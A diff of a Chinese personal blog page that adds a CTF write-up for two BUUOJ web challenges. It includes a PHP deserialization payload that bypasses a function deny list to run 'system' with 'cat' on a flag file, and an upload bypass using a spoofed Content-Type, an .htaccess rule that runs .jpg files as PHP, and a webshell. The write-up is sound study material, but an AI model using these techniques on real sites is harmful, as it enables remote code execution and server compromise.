@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>tags | Kath4rs1s</title>
+  <title>buuoj 刷题记录（一） | Kath4rs1s</title>
   <meta name="keywords" content="">
-  <meta name="description" content="tags | Kath4rs1s">
+  <meta name="description" content="buuoj 刷题记录（一） | Kath4rs1s">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="categories">
@@ -188,19 +188,27 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
+        <article id="post-buuoj_1" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">tags</h1>
+        <h1 class="article-title">buuoj 刷题记录（一）</h1>
     
     <div class="article-meta">
         
         
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="ctf">ctf</a>
+            
+        </span>
         
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-05-28 14:01:53'>2020-05-28 14:00</time>
+            Created At : <time class="date" title='Updated At: 2020-07-13 21:50:46'>2020-07-13 20:30</time>
         
     </div>
     <div class="article-meta">
@@ -222,7 +230,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯-2020-朱雀组-phpweb"><span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-你传你ma呢"><span class="toc-text">[MRCTF2020]你传你ma呢</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -238,7 +246,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯-2020-朱雀组-phpweb"><span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-你传你ma呢"><span class="toc-text">[MRCTF2020]你传你ma呢</span></a></li></ol></div></p>
+<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>抓包<br><img src="https://img2020.cnblogs.com/blog/2015024/202007/2015024-20200713205614948-141053444.png" alt=""></p>
+<p>date是一个函数，后面的p应该是它的参数，猜测使用了call_user_func(函数名，参数)函数<br>使用 <code>func=readfile&amp;p=index.php</code> 读取源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,</span><br><span class="line">		  &quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,</span><br><span class="line">		  &quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,</span><br><span class="line">		  &quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,</span><br><span class="line">		  &quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,</span><br><span class="line">		  &quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,</span><br><span class="line">		  &quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,</span><br><span class="line">		  &quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,</span><br><span class="line">		  &quot;file_put_contents&quot;);</span><br><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result &#x3D; call_user_func($func, $p);</span><br><span class="line">    $a&#x3D; gettype($result);</span><br><span class="line">    if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">    	return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func &#x3D; &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;*</span><br><span class="line">$func &#x3D; $_REQUEST[&quot;func&quot;];</span><br><span class="line">$p &#x3D; $_REQUEST[&quot;p&quot;];</span><br><span class="line">if ($func !&#x3D; null) &#123;</span><br><span class="line">    $func &#x3D; strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>禁用了很多函数，看到有<strong>__destruct()</strong>函数，尝试构造反序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func &#x3D; &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new Test();</span><br><span class="line">&#x2F;&#x2F;$a-&gt;p &#x3D; &#39;find &#x2F; -name flag*&#39;;</span><br><span class="line">$a-&gt;p &#x3D; &#39;cat &#x2F;tmp&#x2F;flagoefiu4r93&#39;;</span><br><span class="line"></span><br><span class="line">$a-&gt;func &#x3D; &#39;system&#39;;</span><br><span class="line">print_r(urlencode(serialize($a)));</span><br></pre></td></tr></table></figure>
+<p>寻找flag文件<br><img src="https://img2020.cnblogs.com/blog/2015024/202007/2015024-20200713210715907-786393955.png" alt=""><br>读取flag<br><img src="https://img2020.cnblogs.com/blog/2015024/202007/2015024-20200713210841560-647790844.png" alt=""></p>
+<h2 id="MRCTF2020-你传你ma呢"><a href="#MRCTF2020-你传你ma呢" class="headerlink" title="[MRCTF2020]你传你ma呢"></a>[MRCTF2020]你传你ma呢</h2><p>利用BurpSuite修改MIME欺骗后端文件类型 修改 Content-Type: image/png 然后就可以传任意文件后缀 利用.htaccess来制作图片马</p>
+<p>增加使用php解析的文件后缀(.jpg)</p>
+<p><code>AddType application/x-httpd-php .jpg</code></p>
+<p><img src="https://img2020.cnblogs.com/blog/2015024/202007/2015024-20200713211316894-2130039522.png" alt=""></p>
+<p>然后再写个一句话，连上蚁剑即可</p>
+<p><img src="https://img2020.cnblogs.com/blog/2015024/202007/2015024-20200713211348265-63074374.png" alt=""></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
